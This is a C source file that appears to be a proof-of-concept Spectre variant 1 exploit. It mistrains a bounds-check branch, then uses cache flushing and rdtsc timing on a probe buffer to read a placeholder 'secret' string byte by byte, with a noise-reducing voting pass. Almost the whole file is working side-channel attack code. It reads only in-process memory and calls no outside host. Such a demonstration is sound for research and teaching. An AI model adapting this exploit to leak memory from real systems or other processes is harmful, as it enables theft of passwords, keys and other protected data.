#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

#define KB 1024
#define KB4 (4096)
#define ROUNDS 100
#define REPEAT 12
#define STATIC_EARLY_EXIT 20
#define PROBE_PAGES 256
#define PROBE_SIZE (KB * 4 * PROBE_PAGES)

// ----- Global vars
volatile char *probe_buffer;
volatile int valid_address = 5;
volatile int *condition;
const char *test;
uint8_t temp = 0;

typedef enum
{
	ERROR,
	INFO,
	SUCCESS
} d_sym_t;


static void _log(d_sym_t symbol, const char *fmt, ...)
{
	switch (symbol)
	{
	case ERROR:
		printf("\x1b[31;1m[-]\x1b[0m ");
		break;
	case INFO:
		printf("\x1b[33;1m[.]\x1b[0m ");
		break;
	case SUCCESS:
		printf("\x1b[32;1m[+]\x1b[0m ");
		break;
	default:
		break;
	}
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
}

void flush(const uint64_t *adrs)
{
	asm __volatile__("mfence\nclflush 0(%0)"
									 :
									 : "r"(adrs)
									 :);
}

int time_access_no_flush(const uint64_t *adrs)
{
	volatile unsigned long time;
	asm __volatile__(
			"  mfence             \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  lfence             \n"
			"  movl %%eax, %%esi  \n"
			"  movl (%1), %%eax   \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  subl %%esi, %%eax  \n"
			: "=a"(time)
			: "c"(adrs)
			: "%esi", "%edx");
	return time;
}

void flush_probe_buffer()
{
	for (int i = 0; i < PROBE_SIZE; i++)
	{
		flush(&probe_buffer[i]);
	}
}

void load_probe_buffer()
{
	for (int i = 0; i < PROBE_PAGES; i++)
	{
		char tmp = probe_buffer[4 * KB * i];
	}
}

void populate_probe_buffer()
{
	for (int i = 0; i < PROBE_SIZE; i++)
	{
		probe_buffer[i] = (unsigned char)(rand() % 256);
	}
}

static void victim_function (size_t target_address)
{
	if (*condition) {
		*(probe_buffer + (*(volatile char *)target_address) * KB4);
	}
}

char __attribute__((optimize("-O0"))) spectre_byte_dynamic(size_t _target_addr)
{
	int rounds = ROUNDS;
	int access_times_mins[256];
	for (int i = 0; i < 256; i++) {
		access_times_mins[i] = 1000000;
	}

	char *temp = malloc(sizeof(char) * 50);
	while (rounds--)
	{
		memcpy(temp, test, 50);
		*condition = 1; 
		for (int i = 0; i < 100; i++) {
			victim_function(&valid_address);
		}
		
		flush(&probe_buffer[valid_address * 4 * KB]);
		*condition = 0;
		flush(condition);
		
		asm volatile("mfence"::: "memory");
		victim_function(_target_addr);

		for (int i = 0; i < 256; i++)
		{
			int access_time = time_access_no_flush(&probe_buffer[i * 4 * KB]);
			if (access_time < access_times_mins[i] && access_time > 0)
			{
				access_times_mins[i] = access_time;
			}
			flush(&probe_buffer[i * 4 * KB]);
		}
	}

	int min_val = 10000;
	int min_idx = 0;
	for (int i = 1; i < 256; i++)
	{
		if (access_times_mins[i] < min_val)
		{
			min_val = access_times_mins[i];
			min_idx = i;
		}
	}

	free(temp);
	return (char)min_idx;
}

char spectre_noise_reduced (size_t addr) {
	char results[REPEAT];
	int sim[REPEAT];
	for (int i = 0; i < REPEAT; i++) sim[i] = 0;
	for (int i = 0; i < REPEAT; i++) {
		char byte = spectre_byte_dynamic(addr);
		results[i] = byte;
	}

	for (int i = 0; i < REPEAT; i++)
	{
		for (int j = 0; j < REPEAT; j++) {
			// if (results[i] == results[j] && ( (results[i] >= 48 && results[i] <= 57) || (results[i] >= 97 && results[i] <= 122 ) ) ) {
			if (results[i] == results[j] ) {
				sim[i]++;
			}
		}
	}
	
	int max_idx = -1;
	int max_val = 0;
	for (int i = 1; i < REPEAT; i++) {
		if (sim[i] > max_val) { max_val = sim[i]; max_idx = i; }
	}

	return results[max_idx];
}

int main(int argc, char *argv[])
{
	// Just used for Proof of concept testing.
	// Assume this memory is stored somewhere in kernel memory.
	test = "TestStringLeakedBySpectre";

	// ----- actual attack
	probe_buffer = malloc(PROBE_SIZE);
	condition = (volatile int *)malloc(sizeof(int));
	populate_probe_buffer();
	flush_probe_buffer();

	_log(SUCCESS, "[Low accuracy - Fast] Decoded secred=");
	for (int i = 0; i < strlen(test); i++)
	{
		char byte = spectre_byte_dynamic(test + i);
		printf("%c", byte);
	}
	printf("\n");
	_log(SUCCESS, "[High accuracy - Slow] Decoded secred=");
	for (int i = 0; i < strlen(test); i++)
	{
		char byte = spectre_noise_reduced(test + i);
		printf("%c", byte);
	}
	printf("\n");

	return 0;
}
